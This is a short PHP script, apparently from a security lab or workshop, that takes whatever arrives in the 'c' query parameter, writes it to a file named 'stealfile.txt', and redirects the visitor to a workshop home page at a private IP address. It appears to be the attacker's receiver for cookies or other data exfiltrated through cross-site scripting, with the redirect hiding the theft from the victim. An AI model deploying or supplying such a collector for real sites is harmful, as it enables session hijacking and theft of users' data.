<?php
if(isset($_GET['c']))
{   
    $txt=$_GET['c'];
    $myfile = fopen("stealfile.txt", "w");
    fwrite($myfile, $txt."\n");
    fclose($myfile);
}
header('location:http://10.10.10.245/workshop/home.php');
?>